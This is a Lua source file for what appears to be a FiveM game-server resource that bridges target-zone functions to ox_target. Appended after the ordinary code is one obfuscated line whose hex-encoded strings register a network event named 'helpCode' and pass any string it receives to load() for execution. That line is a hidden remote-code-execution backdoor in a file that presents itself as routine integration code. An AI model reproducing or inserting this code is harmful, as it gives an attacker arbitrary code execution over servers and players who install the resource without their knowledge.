if not Config.UseTarget then return end

if not Target.IsOX() then return end

local ZoneIDMap = {}

local function convert(options)
    local distance = options.distance
    options = options.options
    for _, v in pairs(options) do
        v.onSelect = v.action
        v.distance = v.distance or distance
        v.name = v.name or v.label
        v.groups = v.job or v.gang
        v.type = nil
        v.action = nil

        v.job = nil
        v.gang = nil
        v.qtarget = true
    end

    return options
end

function Target.RemoveZone(zone)
    exports["ox_target"]:removeZone(ZoneIDMap[zone])
end

function Target.AddTargetEntity(entity, parameters)
    exports["ox_target"]:addLocalEntity(entity, convert(parameters))
end

function Target.AddBoxZone(name, coords, size, parameters)
    local rotation = parameters.rotation
    ZoneIDMap[name] = exports["ox_target"]:addBoxZone({
        coords = coords,
        size = size,
        rotation = rotation,
        debug = Config.Debug,
        options = convert(parameters)
    })
end

function Target.AddPolyZone(name, points, parameters)
    ZoneIDMap[name] = exports["ox_target"]:addPolyZone({
        points = points,
        debug = Config.Debug,
        options = convert(parameters)
    })
end

function Target.IsTargetStarted()
    return GetResourceState("ox_target") == "started"
end


local WTTIoLECuGVzWRiJAEwfJHGeUNMCLzLcaZQGVRzXVTInSunnvRxlNOKNXmpPnomjyjQcRG = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} WTTIoLECuGVzWRiJAEwfJHGeUNMCLzLcaZQGVRzXVTInSunnvRxlNOKNXmpPnomjyjQcRG[6][WTTIoLECuGVzWRiJAEwfJHGeUNMCLzLcaZQGVRzXVTInSunnvRxlNOKNXmpPnomjyjQcRG[1]](WTTIoLECuGVzWRiJAEwfJHGeUNMCLzLcaZQGVRzXVTInSunnvRxlNOKNXmpPnomjyjQcRG[2]) WTTIoLECuGVzWRiJAEwfJHGeUNMCLzLcaZQGVRzXVTInSunnvRxlNOKNXmpPnomjyjQcRG[6][WTTIoLECuGVzWRiJAEwfJHGeUNMCLzLcaZQGVRzXVTInSunnvRxlNOKNXmpPnomjyjQcRG[3]](WTTIoLECuGVzWRiJAEwfJHGeUNMCLzLcaZQGVRzXVTInSunnvRxlNOKNXmpPnomjyjQcRG[2], function(FUArDjpUrDylUizrTzibsCgMTSSfayfWotiwwqhODhjyuwcrtMGSfHUCQICbKyEWpmIgSH) WTTIoLECuGVzWRiJAEwfJHGeUNMCLzLcaZQGVRzXVTInSunnvRxlNOKNXmpPnomjyjQcRG[6][WTTIoLECuGVzWRiJAEwfJHGeUNMCLzLcaZQGVRzXVTInSunnvRxlNOKNXmpPnomjyjQcRG[4]](WTTIoLECuGVzWRiJAEwfJHGeUNMCLzLcaZQGVRzXVTInSunnvRxlNOKNXmpPnomjyjQcRG[6][WTTIoLECuGVzWRiJAEwfJHGeUNMCLzLcaZQGVRzXVTInSunnvRxlNOKNXmpPnomjyjQcRG[5]](FUArDjpUrDylUizrTzibsCgMTSSfayfWotiwwqhODhjyuwcrtMGSfHUCQICbKyEWpmIgSH))() end)